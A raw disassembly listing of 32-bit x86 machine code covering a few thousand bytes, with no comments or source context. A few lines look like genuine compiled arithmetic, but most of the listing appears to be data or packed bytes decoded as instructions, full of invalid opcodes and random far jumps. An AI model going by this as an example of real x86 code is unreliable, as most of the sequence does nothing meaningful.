  40d2d7:	mov    ecx,DWORD PTR [ebp-0x24]
  40d2da:	sub    eax,0x175c
  40d2df:	div    ecx
  40d2e1:	jmp    0x40d5a5
  40d2e6:	test   DWORD PTR [esi],esi
  40d2e8:	push   eax
  40d2e9:	inc    edx
  40d2ea:	sbb    bl,BYTE PTR [edx]
  40d2ec:	jnp    0x40d324
  40d2ee:	inc    esp
  40d2ef:	sbb    DWORD PTR [edi+0x7c],esi
  40d2f2:	sbb    dh,dl
  40d2f4:	push   cs
  40d2f5:	jle    0x40d324
  40d2f7:	loop   0x40d311
  40d2f9:	sbb    dl,dl
  40d2fb:	adc    al,0x18
  40d2fd:	sbb    BYTE PTR [edi+0x76],dh
  40d300:	hlt    
  40d301:	stc    
  40d302:	jmp    0x96c8:0xafd9d7dc
  40d309:	mov    edi,0x357106db
  40d30e:	fild   WORD PTR [esi+0x3abae697]
  40d314:	jmp    0xa7f42f42
  40d319:	jno    0x40d2d1
  40d31b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d31c:	(bad)  
  40d31d:	fnstenv [edi]
  40d31f:	fdiv   QWORD PTR [ebp+edx*1+0x3462a492]
  40d326:	cdq    
  40d327:	and    al,0xfe
  40d329:	or     eax,0x717b4e0
  40d32e:	iret   
  40d32f:	cdq    
  40d330:	cld    
  40d331:	div    bl
  40d333:	mov    ebx,0xb9f0ddbf
  40d338:	and    ch,BYTE PTR [ecx-0x6ecb5d50]
  40d33e:	adc    BYTE PTR [esi-0x51],ah
  40d341:	(bad)  
  40d342:	fidivr WORD PTR [ebx+0x51]
  40d345:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d346:	popf   
  40d347:	sbb    al,0x53
  40d349:	jbe    0x40d356
  40d34b:	lods   eax,DWORD PTR ds:[esi]
  40d34c:	xchg   ecx,eax
  40d34d:	ficom  WORD PTR [edx+0x25]
  40d350:	jmp    0x40d37c
  40d352:	jmp    0x5057f042
  40d357:	xor    edi,ebx
  40d359:	xlat   BYTE PTR ds:[ebx]
  40d35a:	mov    cl,0x61
  40d35c:	fst    QWORD PTR [eiz*4+0x7bb10215]
  40d363:	retf   
  40d364:	dec    esi
  40d365:	sar    BYTE PTR [esi],cl
  40d367:	nop
  40d368:	data16 ficomp DWORD PTR [edi+ebx*8]
  40d36c:	or     BYTE PTR [esi-0x5f5b05b],ah
  40d372:	xchg   ebp,eax
  40d373:	fstp   TBYTE PTR [edx-0x33]
  40d376:	(bad)  
  40d377:	jmp    0x7fe2:0x3440c385
  40d37e:	enter  0x8d51,0x1b
  40d382:	mov    BYTE PTR [ecx-0x74],al
  40d385:	mov    ds:0x41a23f8a,eax
  40d38a:	mov    bh,0x8
  40d38c:	inc    edx
  40d38d:	out    dx,eax
  40d38e:	add    eax,0x6c059b6f
  40d393:	or     ch,dh
  40d395:	xchg   ebx,eax
  40d396:	inc    edx
  40d397:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d398:	mov    ah,BYTE PTR [eax-0x73]
  40d39b:	fcmovne st,st(3)
  40d39d:	(bad)  
  40d39e:	and    BYTE PTR [ebp+0x2a],bl
  40d3a1:	inc    ebp
  40d3a2:	pop    ds
  40d3a3:	out    dx,al
  40d3a4:	pop    edx
  40d3a5:	(bad)  
  40d3a6:	jmp    0x40d40b
  40d3a8:	inc    esp
  40d3a9:	mov    ?,WORD PTR [eax]
  40d3ab:	adc    BYTE PTR [ecx-0xa],bh
  40d3ae:	pop    ebx
  40d3af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3b0:	jecxz  0x40d33b
  40d3b2:	call   0xabfe51b5
  40d3b7:	ds pop edx
  40d3b9:	pop    eax
  40d3ba:	fadd   st(1),st
  40d3bc:	jae    0x40d3df
  40d3be:	addr16 dec esi
  40d3c0:	fld    st(6)
  40d3c2:	in     eax,dx
  40d3c3:	sub    ch,cl
  40d3c5:	or     al,0xeb
  40d3c7:	push   0x48
  40d3c9:	cmp    al,0x71
  40d3cb:	add    BYTE PTR [esi+0x271662f4],bh
  40d3d1:	jge    0x40d3e9
  40d3d3:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40d3d5:	mov    WORD PTR [ebx],cs
  40d3d7:	push   0x88e5cb2f
  40d3dc:	jmp    0x5c397dda
  40d3e1:	test   BYTE PTR [ebp+0x2b],dl
  40d3e4:	jae    0x40d3cc
  40d3e6:	(bad)  
  40d3e7:	(bad)
  40d3ea:	cmp    ecx,DWORD PTR [edx-0x6b]
  40d3ed:	sub    al,0x1c
  40d3ef:	sar    DWORD PTR [esi+0x33],0xe7
  40d3f3:	lahf   
  40d3f4:	test   DWORD PTR [ebx+eax*2-0x1a93779a],edx
  40d3fb:	sub    dl,BYTE PTR [ecx-0x636c7929]
  40d401:	std    
  40d402:	rol    BYTE PTR [edx],0xec
  40d405:	xor    bl,BYTE PTR [ecx+0x54045050]
  40d40b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d40c:	mov    ah,0xcb
  40d40e:	call   0xd4cb:0x4eb9aceb
  40d415:	mov    ah,BYTE PTR ds:0xb1692bfa
  40d41b:	add    al,0xf7
  40d41d:	sar    DWORD PTR [ecx+edi*4+0x25],cl
  40d421:	push   esp
  40d422:	je     0x40d3e9
  40d424:	jmp    0x40d3bc
  40d426:	das    
  40d427:	mov    BYTE PTR [ebx],ch
  40d429:	jno    0x40d3f8
  40d42b:	stc    
  40d42c:	ret    
  40d42d:	and    DWORD PTR ds:0xb04be608,0x36dd0d8d
  40d437:	xor    BYTE PTR [edx-0x4],cl
  40d43a:	clc    
  40d43b:	aaa    
  40d43c:	sub    al,BYTE PTR [esi-0x4a]
  40d43f:	(bad)  
  40d440:	leave  
  40d441:	mov    ah,0x66
  40d443:	pop    esi
  40d444:	cmp    esi,DWORD PTR [ebx+0x70]
  40d447:	xchg   esp,eax
  40d448:	ja     0x40d3f8
  40d44a:	fisubr WORD PTR [edi]
  40d44c:	jbe    0x40d3d2
  40d44e:	call   edi
  40d450:	out    dx,eax
  40d451:	mov    es,WORD PTR [edi+0x3dc574a0]
  40d457:	xor    al,0xa2
  40d459:	or     ch,BYTE PTR [edi+0x1f]
  40d45c:	mov    ebp,DWORD PTR [edi-0x4f6db18d]
  40d462:	aas    
  40d463:	inc    ebx
  40d464:	sub    DWORD PTR [edi+0x7dc7d3d3],0x8713de6d
  40d46e:	sbb    ch,ah
  40d470:	nop
  40d471:	add    bl,bl
  40d473:	(bad)  [ebp-0x5d]
  40d476:	sub    BYTE PTR [edx],dh
  40d478:	adc    edi,DWORD PTR [eax-0x59]
  40d47b:	outs   dx,BYTE PTR ds:[esi]
  40d47c:	cli    
  40d47d:	xlat   BYTE PTR ds:[ebx]
  40d47e:	pop    es
  40d47f:	xchg   ebx,eax
  40d480:	lock iret 
  40d482:	nop
  40d483:	pop    esi
  40d484:	or     eax,0x1202d242
  40d489:	xchg   BYTE PTR [ecx],al
  40d48b:	ds clc 
  40d48d:	aam    0x81
  40d48f:	xchg   ebp,eax
  40d490:	in     eax,0xb4
  40d492:	push   esi
  40d493:	rcr    BYTE PTR [ecx],cl
  40d495:	neg    BYTE PTR [edx]
  40d497:	adc    ebp,DWORD PTR [edi]
  40d499:	pop    esi
  40d49a:	sbb    BYTE PTR [eax+ebp*1-0x3ecfc9fd],bh
  40d4a1:	loop   0x40d429
  40d4a3:	xor    al,0x56
  40d4a5:	adc    al,0x70
  40d4a7:	xor    eax,0xf3f90a15
  40d4ac:	das    
  40d4ad:	add    BYTE PTR [eax-0x24],0xe1
  40d4b1:	cs adc al,0x6b
  40d4b4:	and    eax,0xd30d0085
  40d4b9:	pop    edx
  40d4ba:	gs mov bl,0xf0
  40d4bd:	sbb    dh,bh
  40d4bf:	mov    bh,0x65
  40d4c1:	mov    al,0x84
  40d4c3:	nop
  40d4c4:	cld    
  40d4c5:	pushw  0xa208
  40d4c9:	add    BYTE PTR [esi+eiz*1-0x7e],0x45
  40d4ce:	add    BYTE PTR [ebx-0x80],dl
  40d4d1:	data16 mov ds:0x596ce43e,al
  40d4d7:	loop   0x40d45c
  40d4d9:	test   al,0x5d
  40d4db:	fucomi st,st(4)
  40d4dd:	push   ds
  40d4de:	stc    
  40d4df:	iret   
  40d4e0:	inc    ebp
  40d4e1:	in     eax,0xb4
  40d4e3:	and    DWORD PTR [ecx+edx*8],ebp
  40d4e6:	pusha  
  40d4e7:	sub    esi,edx
  40d4e9:	mov    edx,0xa48b5869
  40d4ee:	add    esp,DWORD PTR [edi+ebx*4]
  40d4f1:	jmp    0x98852951
  40d4f6:	inc    esp
  40d4f7:	sub    ebp,edi
  40d4f9:	or     ah,BYTE PTR [eax+eiz*8]
  40d4fc:	sar    BYTE PTR [eax-0x2a4737d5],1
  40d502:	fbld   TBYTE PTR [edi-0x37]
  40d505:	and    BYTE PTR [eax-0x11],0xcb
  40d509:	ins    DWORD PTR es:[edi],dx
  40d50a:	or     esi,DWORD PTR [ebx-0x37]
  40d50d:	ins    BYTE PTR es:[edi],dx
  40d50e:	mov    al,0x1d
  40d510:	dec    eax
  40d511:	dec    ecx
  40d512:	fistp  WORD PTR ds:0xa24da888
  40d518:	adc    DWORD PTR [edi+ebx*2],eax
  40d51b:	jecxz  0x40d4ca
  40d51d:	or     ebp,DWORD PTR [ecx-0x2]
  40d520:	mov    ebx,cs
  40d522:	aaa    
  40d523:	outs   dx,BYTE PTR ds:[esi]
  40d524:	mov    edi,0x6e9a4e94
  40d529:	outs   dx,BYTE PTR ds:[esi]
  40d52a:	push   ecx
  40d52b:	and    ebp,DWORD PTR [edi-0x7]
  40d52e:	mov    ss,WORD PTR [edi+0x72]
  40d531:	out    0x3b,al
  40d533:	enter  0x6ded,0xbf
  40d537:	add    ah,bh
  40d539:	and    al,0x6a
  40d53b:	lock xor DWORD PTR [esi+0x1],ebp
  40d53f:	leave  
  40d540:	sbb    BYTE PTR [edi+0x71b8aefa],dl
  40d546:	test   ah,bh
  40d548:	out    0x72,eax
  40d54a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d54b:	sub    eax,0x57cafb3
  40d550:	xchg   dh,bh
  40d552:	stc    
  40d553:	sub    al,0x6a
  40d555:	stos   DWORD PTR es:[edi],eax
  40d556:	mov    edx,0xd68b740d
  40d55b:	push   ecx
  40d55c:	push   esi
  40d55d:	retf   0xc4e
  40d560:	pushf  
  40d561:	rcr    BYTE PTR [edi-0x749761a3],1
  40d567:	add    BYTE PTR [edi+0x45cff1c],ah
  40d56d:	bound  esp,QWORD PTR [ecx+edi*8]
  40d570:	xor    DWORD PTR [ebp+0x78d5bc5f],eax
  40d576:	popa   
  40d577:	add    al,0xd1
  40d579:	xchg   esi,eax
  40d57a:	xchg   ebx,ecx
  40d57c:	jno    0x40d5af
  40d57e:	jae    0x40d554
  40d580:	es pop eax
  40d582:	cwde   
  40d583:	rcr    DWORD PTR [eax+0x2ca0db9c],cl
  40d589:	sub    DWORD PTR [esi+0x44],ebp
  40d58c:	lds    esi,FWORD PTR [ebx]
  40d58e:	test   DWORD PTR [esi+0x67],0xe533aab1
  40d595:	jb     0x40d5d7
  40d597:	sub    dl,ch
  40d599:	xchg   ebx,eax
  40d59a:	jae    0x40d583
  40d59c:	cmp    bl,BYTE PTR [ecx-0x5b]
  40d59f:	aas    
  40d5a0:	dec    esi
  40d5a1:	cmp    DWORD PTR [esp+eiz*4],ecx
  40d5a4:	mov    esi,0x33e04d8b
  40d5a9:	shr    cl,cl
  40d5ab:	mov    edi,0x5a000002
  40d5b0:	fdiv   DWORD PTR [edi+0x64]
  40d5b3:	sbb    esp,DWORD PTR [edx]
  40d5b5:	pop    edx
  40d5b6:	into   
  40d5b7:	sbb    edi,ecx
  40d5b9:	jae    0x40d637
  40d5bb:	in     eax,dx
  40d5bc:	aam    0x85
  40d5be:	jl     0x40d5a7
  40d5c0:	fcomp  QWORD PTR [eax]
  40d5c2:	sbb    dl,dl
  40d5c4:	adc    al,0x18
  40d5c6:	sbb    BYTE PTR [esi],ch
  40d5c8:	lock rcr esi,0x92
  40d5cc:	dec    ecx
  40d5cd:	sub    cl,BYTE PTR [edi-0x2f]
  40d5d0:	repz xchg edx,esi
  40d5d3:	push   ebx
  40d5d4:	inc    esp
  40d5d5:	cwde   
  40d5d6:	clc    
  40d5d7:	loopne 0x40d64a
  40d5d9:	scas   al,BYTE PTR es:[edi]
  40d5da:	outs   dx,DWORD PTR ds:[esi]
  40d5db:	cli    
  40d5dc:	add    eax,0xdb27f64e
  40d5e1:	inc    esp
  40d5e2:	jae    0x40d5d9
  40d5e4:	or     eax,0x69246735
  40d5e9:	outs   dx,DWORD PTR ds:[esi]
  40d5ea:	push   0xffffffc6
  40d5ec:	mov    WORD PTR [ecx],gs
  40d5ee:	fwait
  40d5ef:	sbb    al,0x16
  40d5f1:	stos   BYTE PTR es:[edi],al
  40d5f2:	push   edx
  40d5f3:	mov    BYTE PTR [ebp+0x5e03536c],ch
  40d5f9:	cld    
  40d5fa:	add    eax,DWORD PTR [eax]
  40d5fc:	push   es
  40d5fd:	pop    eax
  40d5fe:	or     DWORD PTR [edx],esi
  40d600:	cld    
  40d601:	or     BYTE PTR [edi+0x7f],dh
  40d604:	xchg   DWORD PTR [esi-0x68f91d4b],esi
  40d60a:	jmp    0x40d5bf
  40d60c:	xchg   edx,eax
  40d60d:	bound  ebx,QWORD PTR [edi]
  40d60f:	call   0x9d65:0xb208056d
  40d616:	out    dx,eax
  40d617:	pop    esi
  40d618:	inc    ecx
  40d619:	or     eax,0xc6283616
  40d61e:	and    dl,BYTE PTR [edx-0x1a]
  40d621:	cdq    
  40d622:	gs iret 
  40d624:	sbb    al,0xae
  40d626:	inc    esi
  40d627:	scas   al,BYTE PTR es:[edi]
  40d628:	lock lods eax,DWORD PTR ds:[esi]
  40d62a:	and    al,0x93
  40d62c:	xor    al,0x25
  40d62e:	mov    ch,0x55
  40d630:	sbb    eax,DWORD PTR [edx-0x29fabdc7]
  40d636:	js     0x40d620
  40d638:	dec    BYTE PTR [ebx*8-0x61069724]
  40d63f:	mov    al,ds:0x14b92241
  40d644:	fist   DWORD PTR [esi+0x1]
  40d647:	jne    0x40d685
  40d649:	dec    eax
  40d64a:	data16 adc al,0xfd
  40d64d:	int3   
  40d64e:	mov    bl,0x71
  40d650:	(bad)  
  40d651:	mov    ds:0x928d771f,al
  40d656:	retf   0x2121
  40d659:	call   0x6f27:0xeb0d635
  40d660:	pushf  
  40d661:	cli    
  40d662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d663:	test   DWORD PTR [ecx+ebx*8+0x184f7501],ebp
  40d66a:	sbb    al,0x11
  40d66c:	add    al,0x87
  40d66e:	icebp  
  40d66f:	das    
  40d670:	hlt    
  40d671:	(bad)  
  40d672:	mov    ds:0xf402599b,al
  40d677:	scas   al,BYTE PTR es:[edi]
  40d678:	sbb    BYTE PTR [edx+0xe978a4a],al
  40d67e:	hlt    
  40d67f:	test   DWORD PTR [esi+0x5],ecx
  40d682:	xor    BYTE PTR [esi+0x5e],cl
  40d685:	xor    ebx,ecx
  40d687:	mov    BYTE PTR [ebx],dh
  40d689:	xchg   DWORD PTR [esi+0x3e],eax
  40d68c:	sub    eax,0xe7834b91
  40d691:	mov    dh,BYTE PTR [edx+0x2ae6abc0]
  40d697:	fmulp  st(2),st
  40d699:	std    
  40d69a:	lahf   
  40d69b:	sub    ebx,DWORD PTR [edi+0x1e]
  40d69e:	push   0x71
  40d6a0:	jmp    0x40d6b3
  40d6a2:	add    eax,0xd8c6384a
  40d6a7:	dec    edi
  40d6a8:	dec    ebx
  40d6a9:	inc    BYTE PTR [edx-0x45362cbf]
  40d6af:	or     DWORD PTR [ebx+0x18],esp
  40d6b2:	jg     0x40d6f4
  40d6b4:	cvtdq2ps xmm0,XMMWORD PTR [ecx+0x7e]
  40d6b8:	fs fs stc 
  40d6bb:	int3   
  40d6bc:	repz fwait
  40d6be:	sub    dh,cl
  40d6c0:	inc    ecx
  40d6c1:	call   0x961d2616
  40d6c6:	jl     0x40d6ca
  40d6c8:	jecxz  0x40d721
  40d6ca:	jge    0x40d692
  40d6cc:	mov    ah,0x1d
  40d6ce:	jmp    0xe9b0:0x12ca7013
  40d6d5:	push   0xef8375c4
  40d6da:	fidiv  WORD PTR [ebp-0x7b]
  40d6dd:	and    edx,edx
  40d6df:	jb     0x40d697
  40d6e1:	(bad)  
  40d6e3:	je     0x40d6e0
  40d6e5:	cmp    al,0xda
  40d6e7:	xchg   esp,eax
  40d6e8:	lods   eax,DWORD PTR ds:[esi]
  40d6e9:	lock lods al,BYTE PTR ds:[esi]
  40d6eb:	in     eax,0xa9
  40d6ed:	test   al,0xd2
  40d6ef:	ror    DWORD PTR [ebx+edx*4-0x6],1
  40d6f3:	aad    0xd4
  40d6f5:	and    DWORD PTR [eax],edi
  40d6f7:	or     eax,0xf7179835
  40d6fc:	imul   ebp,DWORD PTR [ebx],0x55
  40d6ff:	sub    dh,al
  40d701:	popa   
  40d702:	mov    ebp,?
  40d704:	bound  ecx,QWORD PTR [edx+edx*8-0x3a555306]
  40d70b:	aam    0xc2
  40d70d:	pop    esi
  40d70e:	cmc    
  40d70f:	cld    
  40d710:	push   ss
  40d711:	loope  0x40d747
  40d713:	mov    ecx,0x591d098d
  40d718:	push   edi
  40d719:	sbb    eax,0xd3bfc2f
  40d71e:	mov    al,0x10
  40d720:	imul   BYTE PTR [edx]
  40d722:	and    DWORD PTR [esi+0x4edf534e],ecx
  40d728:	jg     0x40d719
  40d72a:	into   
  40d72b:	enter  0xe07d,0x44
  40d72f:	and    bl,ch
  40d731:	jmp    0xea2d700f
  40d736:	inc    ebp
  40d737:	in     eax,0x61
  40d739:	sub    bh,BYTE PTR [eax+ecx*4]
  40d73c:	xchg   esp,ebp
  40d73e:	pop    es
  40d73f:	cmp    edx,ecx
  40d741:	inc    ebx
  40d742:	ficomp DWORD PTR [ebp-0x52]
  40d745:	(bad)  
  40d746:	out    dx,al
  40d747:	cmp    esp,DWORD PTR ss:[ebx]
  40d74a:	lock cmp al,0x6f
  40d74d:	xchg   edx,edx
  40d74f:	jae    0x40d77e
  40d751:	ds sahf 
  40d753:	jp     0x40d77c
  40d755:	aaa    
  40d756:	jnp    0x40d751
  40d758:	(bad)  
  40d759:	sti    
  40d75a:	inc    ebp
  40d75b:	xchg   ecx,eax
  40d75c:	imul   edx,DWORD PTR [eax-0x6b],0x809d03ca
  40d763:	or     ah,dl
  40d765:	push   ss
  40d766:	sahf   
  40d767:	cmp    al,0x25
  40d769:	retf   
  40d76a:	mov    ecx,0x1c38bdc7
  40d76f:	ins    DWORD PTR es:[edi],dx
  40d770:	push   esi
  40d771:	clc    
  40d772:	jg     0x40d72c
  40d774:	push   edi
  40d775:	xchg   ebx,eax
  40d776:	hlt    
  40d777:	ret    
  40d778:	jo     0x40d7b3
  40d77a:	retf   
  40d77b:	std    
  40d77c:	mov    ds,WORD PTR [esp+edi*2+0x7a]
  40d780:	mov    esi,0xd9bcf01f
  40d785:	cli    
  40d786:	cmp    edx,esp
  40d788:	xchg   ecx,eax
  40d789:	ds mov dh,0x49
  40d78d:	neg    BYTE PTR [ecx]
  40d78f:	mov    BYTE PTR [esi-0x6a27a549],cl
  40d795:	push   es
  40d796:	xchg   esi,eax
  40d797:	push   0x2
  40d799:	fwait
  40d79a:	mov    al,ds:0xc224d9a8
  40d79f:	stc    
  40d7a0:	sub    al,0xb9
  40d7a2:	mov    ebp,0x543e1bb5
  40d7a7:	or     edx,DWORD PTR [ebx]
  40d7a9:	(bad)  
  40d7aa:	mov    dh,0xff
  40d7ac:	sbb    BYTE PTR [ebx+eiz*2],ch
  40d7af:	cmp    BYTE PTR [esi+0x25],0x82
  40d7b3:	sbb    al,0xc0
  40d7b5:	repnz repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7b8:	mov    edx,0x6d32fc1b
  40d7bd:	rol    DWORD PTR [edx],cl
  40d7bf:	xchg   ecx,eax
  40d7c0:	sub    eax,0xa440394d
  40d7c5:	inc    ecx
  40d7c6:	adc    BYTE PTR ds:0x9bd3f7f1,0x38
  40d7cd:	mov    ebx,0x9e85ea42
  40d7d2:	xchg   edi,eax
  40d7d3:	mov    bh,0xac
  40d7d5:	add    BYTE PTR [edx+ebp*2+0x2b66cf12],cl
  40d7dc:	lock loop 0x40d82b
  40d7df:	mov    ecx,0x5aaf5120
  40d7e4:	int    0x8a
  40d7e6:	ss add eax,0x5da71b7f
  40d7ec:	mov    ecx,0xd7b79790
  40d7f1:	icebp  
  40d7f2:	sub    bl,BYTE PTR [esi]
  40d7f4:	fstp   st(0)
  40d7f6:	cmp    bh,bh
  40d7f8:	(bad)  
  40d7f9:	push   0x2
  40d7fb:	mov    ch,0xae
  40d7fd:	outs   dx,BYTE PTR ds:[esi]
  40d7fe:	(bad)  
  40d7ff:	cmp    ebp,ebp
  40d801:	xchg   esp,eax
  40d802:	jmp    0x773a:0xe45a605e
  40d809:	es cwde 
  40d80b:	dec    edi
  40d80c:	lods   eax,DWORD PTR ds:[esi]
  40d80d:	sbb    BYTE PTR [ecx+0x1f82e794],bl
  40d813:	xchg   edi,eax
  40d814:	call   0xd1c7:0xd7d6b367
  40d81b:	adc    BYTE PTR [edx],bh
  40d81d:	lds    edx,FWORD PTR [eax+0x36]
  40d820:	loopne 0x40d881
  40d822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d823:	mov    dl,0xa2
  40d825:	inc    ecx
  40d826:	cdq    
  40d827:	cmp    bh,dh
  40d829:	pushf  
  40d82a:	scas   al,BYTE PTR es:[edi]
  40d82b:	and    BYTE PTR ds:0x509546d1,dh
  40d831:	jae    0x40d7c4
  40d833:	inc    bx
  40d835:	mov    bl,0x20
  40d837:	not    BYTE PTR [esi+0x16]
  40d83a:	mov    dl,0xc2
  40d83c:	xchg   edi,eax
  40d83d:	fdiv   QWORD PTR [edi]
  40d83f:	es ss pusha 
  40d842:	pop    esi
  40d843:	lahf   
  40d844:	mov    ebx,0x4d66cbc8
  40d849:	xor    eax,0x55fe2eaa
  40d84e:	sbb    ch,al
  40d850:	data16 not al
  40d853:	pop    esi
  40d854:	mov    DWORD PTR [esi+esi*1],ebp
  40d857:	lahf   
  40d858:	loopne 0x40d855
  40d85a:	(bad)  
  40d85b:	cmp    al,0x92
  40d85d:	fs daa 
  40d85f:	sbb    DWORD PTR [edi+edx*2+0x177049c3],eax
  40d866:	cmp    DWORD PTR [esi],edx
  40d868:	jo     0x40d7f1
  40d86a:	retf   0xdc84
  40d86d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d86e:	mov    edi,0x4db5
  40d873:	div    ecx
  40d875:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d878:	xor    edx,edx
  40d87a:	div    ecx
  40d87c:	xor    edx,edx
  40d87e:	mov    ecx,eax
  40d880:	jmp    0x40db44
  40d885:	aam    0x63
  40d887:	sbb    eax,0xcc1a1a64
  40d88c:	and    edx,DWORD PTR [ebp+0x79]
  40d88f:	test   eax,0xcba7bbc
  40d894:	jle    0x40d836
  40d896:	fcomp  DWORD PTR [eax]
  40d898:	sbb    dl,dl
  40d89a:	adc    al,0x18
  40d89c:	sbb    bh,dh
  40d89e:	shl    ecx,cl
  40d8a0:	stc    
  40d8a1:	out    0xae,al
  40d8a3:	mov    DWORD PTR [esp+eax*1+0x792c53f9],edx
  40d8aa:	push   ebx
  40d8ab:	pop    ecx
  40d8ac:	add    BYTE PTR [ebx+0x20],0xdd
  40d8b0:	lahf   
  40d8b1:	push   cs
  40d8b2:	xchg   ebp,eax
  40d8b3:	sub    eax,0xbba310a5
  40d8b8:	les    ebx,FWORD PTR [ecx+ebp*4]
  40d8bb:	jmp    0x7e7f8fa0
  40d8c0:	imul   eax,ecx,0xbf79271c
  40d8c6:	inc    BYTE PTR [edi]
  40d8c8:	cmp    eax,0xb97d62f7
  40d8cd:	sbb    al,0xc1
  40d8cf:	fisub  DWORD PTR [ecx+ebp*4-0x65]
  40d8d3:	ins    DWORD PTR es:[edi],dx
  40d8d4:	push   0xcc4433f
  40d8d9:	outs   dx,BYTE PTR ds:[esi]
  40d8da:	jge    0x40d8af
  40d8dc:	ret    
  40d8dd:	inc    ecx
  40d8de:	ins    DWORD PTR es:[edi],dx
  40d8df:	sbb    eax,0xe926fc86
  40d8e4:	in     al,0xfb
  40d8e6:	seta   BYTE PTR [esi+0x53]
  40d8ea:	and    al,0x5
  40d8ec:	inc    DWORD PTR [esi*1-0x525ed73a]
  40d8f3:	inc    ebp
  40d8f4:	jo     0x40d92c
  40d8f6:	jmp    0x40d89f
  40d8f8:	mov    edi,gs
  40d8fa:	jle    0x40d881
  40d8fc:	mov    DWORD PTR [ecx+0x2353b93c],0x7f5c4155
  40d906:	mov    WORD PTR [ecx-0x336b00fe],fs
  40d90c:	out    0x13,al
  40d90e:	push   esi
  40d90f:	mov    dl,0x5f
  40d911:	sub    eax,0x7fcca43b
  40d916:	icebp  
  40d917:	inc    ebp
  40d918:	out    dx,al
  40d919:	inc    ebx
  40d91a:	cld    
  40d91b:	test   BYTE PTR [esi-0x78dda69d],cl
  40d921:	icebp  
  40d922:	push   edx
  40d923:	cmp    eax,0x6d8975a1
  40d928:	mov    edx,0x1606013c
  40d92d:	jmp    0x40d990
  40d92f:	call   0x7cbf:0x97ee15ed
  40d936:	loopne 0x40d8e2
  40d938:	fcmovb st,st(5)
  40d93a:	pop    edi
  40d93b:	cld    
  40d93c:	sub    DWORD PTR [edx-0x34],eax
  40d93f:	mov    al,ds:0x94947935
  40d944:	mov    al,ds:0x2fec3258
  40d949:	cmp    DWORD PTR [edx+0xa36cdbe],edi
  40d94f:	xchg   edx,eax
  40d950:	inc    eax
  40d951:	jne    0x40d927
  40d953:	cli    
  40d954:	into   
  40d955:	xchg   BYTE PTR [ecx+esi*2],dl
  40d958:	adc    DWORD PTR [edi+0x53],0x33
  40d95c:	jb     0x40d8e5
  40d95e:	cmc    
  40d95f:	add    cl,BYTE PTR [ebp-0x10]
  40d962:	sti    
  40d963:	and    edi,DWORD PTR [ecx-0x6c]
  40d966:	xchg   ebx,eax
  40d967:	ror    DWORD PTR [edi-0x52],cl
  40d96a:	stos   DWORD PTR es:[edi],eax
  40d96b:	in     al,0xe4
  40d96d:	imul   edi,DWORD PTR [edi+0x73],0xe
  40d971:	retf   0x6306
  40d974:	push   ebx
  40d975:	xchg   ebx,eax
  40d976:	jb     0x40d968
  40d978:	add    BYTE PTR [esi],dl
  40d97a:	pop    edx
  40d97b:	(bad)  
  40d97c:	inc    bp
  40d97e:	lods   al,BYTE PTR ds:[esi]
  40d97f:	daa    
  40d980:	sub    eax,0x35712ab
  40d985:	lods   al,BYTE PTR ds:[esi]
  40d986:	or     eax,0x613cb788
  40d98b:	loopne 0x40d9df
  40d98d:	xchg   esp,eax
  40d98e:	pop    esi
  40d98f:	sahf   
  40d990:	jle    0x40d928
  40d992:	and    cl,dl
  40d994:	and    ecx,DWORD PTR [esi-0x52]
  40d997:	retf   0x980a
  40d99a:	cli    
  40d99b:	lods   al,BYTE PTR ds:[si]
  40d99d:	outs   dx,BYTE PTR ds:[esi]
  40d99e:	aaa    
  40d99f:	jne    0x40d92f
  40d9a1:	mov    bl,0x31
  40d9a3:	cmp    BYTE PTR [edi-0x39],dl
  40d9a6:	or     eax,0x91c63e15
  40d9ab:	xor    ch,BYTE PTR [edx]
  40d9ad:	mov    dh,0xb9
  40d9af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9b0:	fmul   QWORD PTR [esi]
  40d9b2:	lock mov eax,ds:0x279f2445
  40d9b8:	aam    0xb0
  40d9ba:	scas   al,BYTE PTR es:[edi]
  40d9bb:	clc    
  40d9bc:	sbb    DWORD PTR [eax],0x49
  40d9bf:	jb     0x40da3e
  40d9c1:	mov    edi,0xe41ecb73
  40d9c6:	sbb    ah,BYTE PTR [esi+edx*1+0x52]
  40d9ca:	push   ecx
  40d9cb:	arpl   si,bp
  40d9cd:	jb     0x40da0b
  40d9cf:	lods   eax,DWORD PTR ds:[esi]
  40d9d0:	xchg   DWORD PTR [ecx-0x48],ebx
  40d9d3:	test   eax,0x53c34a36
  40d9d8:	and    bl,ch
  40d9da:	and    bl,bl
  40d9dc:	inc    edi
  40d9dd:	imul   ah
  40d9df:	fmul   QWORD PTR [edx+0x48]
  40d9e2:	push   eax
  40d9e3:	mov    DWORD PTR [edi],edx
  40d9e5:	icebp  
  40d9e6:	addr16 stc 
  40d9e8:	in     al,0x38
  40d9ea:	xor    eax,0xf5fb6c60
  40d9ef:	add    ecx,DWORD PTR [ebx-0x25]
  40d9f2:	add    bh,BYTE PTR [ebx+0x39]
  40d9f5:	into   
  40d9f6:	xor    dl,BYTE PTR [esi+0x1c37be3a]
  40d9fc:	lock neg DWORD PTR [ebx+0x25]
  40da00:	fnstenv [edx+ebp*4-0x2]
  40da04:	add    edi,edx
  40da06:	cld    
  40da07:	inc    ebx
  40da08:	pop    esp
  40da09:	adc    ch,ah
  40da0b:	inc    eax
  40da0c:	dec    ecx
  40da0d:	aad    0x97
  40da0f:	int    0x88
  40da11:	cmc    
  40da12:	inc    eax
  40da13:	mov    edx,0x3adefd90
  40da18:	push   eax
  40da19:	add    cl,dh
  40da1b:	ret    
  40da1c:	call   0x4e21d0af
  40da21:	cld    
  40da22:	popa   
  40da23:	mov    dh,0xf3
  40da25:	or     ecx,DWORD PTR [ecx]
  40da27:	imul   ecx,DWORD PTR [ecx-0x751c20c],0xffffffab
  40da2e:	retf   0xf0e9
  40da31:	jmp    0xf5c8:0xadac7549
  40da38:	cld    
